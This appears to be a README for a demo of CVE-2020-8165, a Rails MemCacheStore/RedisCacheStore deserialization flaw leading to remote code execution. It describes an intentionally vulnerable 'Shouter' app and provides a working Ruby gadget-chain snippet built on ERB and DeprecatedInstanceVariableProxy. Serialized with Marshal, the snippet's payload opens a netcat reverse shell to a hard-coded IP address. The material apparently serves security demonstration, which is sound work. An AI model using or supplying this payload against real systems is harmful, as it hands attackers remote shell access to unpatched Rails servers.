# CVE-2020-8165 Demo

Yet another demo of CVE-2020-8165, though in a more realistic implementation than most.

## Background

*CVE-2020-8165*

> A deserialization of untrusted data vulnernerability exists in rails < 5.2.4.3, rails < 6.0.3.1 that can allow an attacker to unmarshal user-provided objects in MemCacheStore and RedisCacheStore potentially resulting in an RCE.

### References

- https://hackerone.com/reports/413388
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8165
- https://nvd.nist.gov/vuln/detail/CVE-2020-8165
- https://www.cvebase.com/cve/2020/8165
- https://lab.wallarm.com/exploring-de-serialization-issues-in-ruby-projects-801e0a3e5a0a/

## Implementation

The "Shouter" app has a caching feature in its `Shout` model where optional images that are submitted with a shout:string are cached in redis and retrieved from there rather than the DB. Because the vulnerable `Rails.cache.fetch` method is used to interact with the cache, this app is susceptible to CVE-2020-8165, and the results of the RCE are placed in the src of the `img` tags in the dashboard route.

### Generating RCE payloads

The following snippet will generate the payload you need to send using `exploit.py`. There's some nuance with the serialization step that needs to be figured out to implement the exploit fully Python. Hence, `Marshal.dump` in Ruby is needed to generate the exact payload (for now). 

```ruby
cmd = "Thread.new{system('nc 172.17.188.169 3001 -e /bin/bash')}"
erb = ERB.allocate
erb.instance_variable_set(:@src, cmd)
erb.instance_variable_set(:@lineno, 0)
payload_raw = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result)
payload = Marshal.dump(payload_raw)
p payload
```
